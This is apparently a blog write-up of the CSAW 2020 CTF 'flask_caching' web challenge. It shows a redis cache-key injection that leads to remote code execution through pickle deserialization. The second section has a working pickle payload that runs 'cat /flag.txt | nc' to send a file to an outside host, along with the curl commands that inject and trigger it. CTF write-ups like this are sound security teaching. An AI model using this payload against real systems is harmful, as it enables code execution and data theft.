---
title: CSAW 2020 flask_caching
date: 2020-09-15
---

The 300 point web problem in the 2020 CSAW CTF seems to have a reasonable
number of solves, and I don't have much time in the evening, so I think I'll
start there.

## What's in a name? ##

The problem comes with a single source file for a flask-based webapp, `app.py`,
and a link to a live instance.

Scanning the source, the following line stands out:

```python3
redis.setex(name=title, value=content, time=3)
```

This looks like it could represent some sort of injection vulnerability. The
two things I imagine need to hold for this to be useful are:

* The `flask_caching` implementation uses predictable keys for cache entries.
* The `title` here is not being sanitized to prevent it from colliding with
  those predictable keys.

So I start into verifying the former by pulling down source for
`flask_caching` (or rather diving into the existing virtualenv I had made), but
a reality check from a teammate, Flay, saves me some time: just running the
app locally, and using `redis-cli KEYS '*'` after requesting a cached view,
spits out a deterministic result:

```sh
$ curl -s http://0.0.0.0:5000/test0 >/dev/null && redis-cli KEYS '*'
1) "flask_cache_view//test0"
```

By inspection we can also all but confirm the latter: the `title` is only
required to be present in the request, and have a length of no more than `100`
codepoints (or bytes, not sure what kind of string it is, and it ends up being
immaterial anyway).

Let's try this all out with an example:

```sh
$ curl -s http://0.0.0.0:5000/test0 >/dev/null \
    && redis-cli GET flask_cache_view//test0 \
    && printf 'foobar' | curl -s http://0.0.0.0:5000/ -X POST \
        -F title=flask_cache_view//test0 -F content=@- \
    && redis-cli GET flask_cache_view//test0
"!\x80\x04\x95\b\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94."
Thanks!
"foobar"
```

Great!

## Weaponizing a Pickle ##

My first thought, shared by others on the team, is that the most likely vector
to exploit this vulnerability is at the point where a live cache entry is
deserialized, and most likely the serialization being used is Pickle. This may
just be wishful thinking, as Pickle is known to represent RCE on untrusted
input, but a quick grep of the `flask_caching` source bears it out. A few lines
of `python` later and we have something to test:

```python3
#!/usr/bin/env python3

import pickle
import sys
import os

# this form of de-pickle code execution found by googling "python pickle
# injection" which is a delightful name
class Payload():
    def __reduce__(self):
        # the path '/flag.txt' discovered via `ls`, then `ls /`
        return (os.system, ('cat /flag.txt | nc <redacted> 1234',))

# flask_caching prepends '!' to the cache_key when it is a non-integer,
# seemingly as an optimization for integer keys?
sys.stdout.buffer.write(b'!' + pickle.dumps(Payload()))
```

With a listen server set up to catch the flag, we can inject the payload into
the cache and then request the cached view to become the `f1@sK_10rD`:

```sh
$ nc -l 1234 &
$ ./payload.py \
    | curl -s http://web.chal.csaw.io:5000/ -X POST \
        -F title=flask_cache_view//test0 -F content=@- >/dev/null \
    | curl -s http://web.chal.csaw.io:5000/test0 >/dev/null
flag{f1@sK_10rD}
```
